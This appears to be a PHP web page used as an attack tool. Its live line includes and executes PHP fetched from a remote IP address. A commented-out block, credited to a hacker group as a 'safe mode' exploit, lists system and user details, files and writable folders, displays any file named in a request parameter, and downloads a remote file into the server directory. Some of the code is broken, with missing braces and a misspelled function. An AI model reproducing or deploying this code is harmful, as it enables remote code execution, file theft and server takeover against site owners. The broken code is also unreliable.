<html>
<head>
</head>
<body>
<pre><font face="Tahoma" size="2">
<?php
//include "http://bnetbrasil.servegame.com/admincp/login.php";
//http://www.chmod.com.br/vb/showthread.php?7474-PHP-injection-como-burlar-sistemas-rodando-php
$corpo = include "http://188.165.23.200/index.php";

echo $corpo;


/* echo "<font size=2>";
echo "PHP Write and Read in SafeMode. Exploit By Cr4shyng of Data Cha0s
";
$uname = posix_uname();
while (list($teste, $teste1) = each ($uname))
echo "$teste: $teste1
";

$dono = get_current_user();
echo "current user Script: $dono
";
$ver = phpversion();
echo "php version: $ver
";
$login = posix_getuid();
echo "user info: id($login)";
$euid = posix_geteuid();
$gid = posix_getgid();
echo " gid($gid)";
echo " euid($euid)
";
if ($dir2 =="")
$dir2 = getced();

echo "current Path: $dir2
";
if ($dir = @opendir($dir2))
echo"<TABLE border=1 cellspacing=1 cellpadding=0>";
echo"<TR>";
echo "<TD valign=top>";
echo "<font size=2 face=arial>List All Files 

";
while (($file = readdir($dir)) !== false)
if (@is_file($file))
$file1 = fileowner($file);
$file2 = fileperms($file);
echo "<font color=green>$file1 - $file2 - $file </font>
";
flush();

echo "</TD>";
echo "<TD valign=top>";
echo "<font size=2 face=arial>List Only Folders 

";
if ($dir = @opendir($dir2))
while (($file = readdir($dir)) !== false)
if (@is_dir($file))
$file1 = fileowner($file);
$file2 = fileperms($file);
echo "<font color=blue>$file1 - $file2 - $file </font>
";

echo "</TD>";
echo "<TD valign=top>";
echo "<font size=2 face=arial>List Writable Folders 

";
if ($dir = @opendir($dir2))
while (($file = readdir($dir)) !== false)
if (@is_writable($file) &&
@is_file ($file) )
$file1 = fileowner($file);
$file2 = fileperms($file);
echo "<font color=red>$file1 - $file2 - $file </font>
";
echo "</TD>";
echo "</TR>";
echo "</TABLE>";

// Function to Visualize Source Code files
if ($see == "")
{}
else
$fp = fopen($see, "r");
$read = fread($fp, 30000);
echo "<textarea name=textarea cols=80 rows=80>";
echo "$read";
echo "</textarea>";

if ($dfc == "" || $fdfc == "")
{}
else
$rox = fopen("http://bnetbrasil.servegame.com/admincp/login.php", "r"); // Change this IP/FILE
$data = fread($rox, "9000");
$d = fopen($dir2.$fdfc, "w");
fwrite($d, $data);
?>
</font></pre>


 */

?>
</body>
</HTML>